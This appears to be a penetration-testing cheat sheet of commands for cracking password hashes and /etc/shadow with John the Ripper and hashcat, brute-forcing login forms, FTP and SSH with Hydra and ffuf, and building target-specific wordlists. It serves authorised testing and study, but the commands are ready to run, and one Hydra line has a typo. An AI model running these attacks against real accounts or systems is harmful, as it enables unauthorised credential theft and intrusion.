## Password Cracking
### John The Ripper
#### Crack hash
```bash
john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
```
#### Cracking `/etc/shadow`
```bash
unshadow shadow.txt passwd.txt > unshadowed.txt
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
### Hashcat

#### Crack Hash
```bash
hashcat -m hashmode_id pw_hash.txt /usr/share/wordlist/rockyou.txt
```
Learn more about hashmodes [here](https://hashcat.net/wiki/doku.php?id=example_hashes).
### Identify Hash Type
```bash
hash-identifier
```

## Brute Forcing / Dictionary Attack
### Hydra
#### HTML Form
```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt target.com http-form-post "/auth/login.php:username=^USER^&password=^PASS^:Invalid username/password combination." -o results.txt -vV
```
#### HTML Form with Fail and Success String
```bash
hydra -L usernames.txt =P /usr/share/wordlists/rockyou.txt target.com -s 8080 http-form-post "/auth/login.php:username=^USER^&password=^PASS^:F=Invalid credentials:S=Login success.:H=Cookie: PHPSESSID=abcd1234" -o results.txt -vV
```
> Note: If results are not showing, such as the page only refreshes if credentials dont match, we can just use an HTML tag as follows: `F=<form name='login'`.
#### FTP
```bash
hydra -L usernames -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ftp -s 10021 -o results.txt -vV
```
> Note: We can use the `-C` option for combined credential wordlists (i.e `hydra -C combined-http-auth.txt 10.10.10.10 -s 8080 http-get -o results.txt -vV`)
#### SSH
```bash
hydra -L harry.txt -P /usr/share/wordlists/rockyou.txt -u 10.10.10.10 ssh -o results.txt -vV
```
> Note: The `-u` parameter tests every username for every password row, instead of the other way around.
### Ffuf
#### Single Wordlist
```bash
ffuf -w wordlist.txt -u <http://target.com/login> -X POST -d "username=admin&password=FUZZ" -b "Cookie Value" -H "Header-Key: HeaderValue" -fc 200
```
#### Multiple Wordlist
```bash
ffuf -w wordlist.txt:USER,wordlist.txt:PASS -u <http://target.com/login> -X POST -d "username=USER&password=PASS" -b "Cookie Value" -H "Header-Key: HeaderValue" -fc 200
```
## Custom Wordlist
### Generate Password Wordlist Using Hashcat Rules
```bash
hashcat --stdout raw_pw.txt -r /usr/share/hashcat/rules/best64.rule > output.txt
```
### Generate Password Wordlist Using Cupp
```bash
cupp -i # interactive; just follow it
```
### Generate Username Wordlist Using Username-Anarchy
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git

./username-anarchy Bill Gates > bill.txt
```

We can also use tools like [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist) to add as many alterations and permutations as possible into our wordlist.

Additionally, we can then use `sed` to further customize the generated wordlist to follow the target's password policy. For example:
```bash
sed -ri '/^.{,7}$/d' custom-password.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' custom-password.txt # remove no special chars
sed -ri '/[0-9]+/!d' custom-password.txt            # remove no numbers
```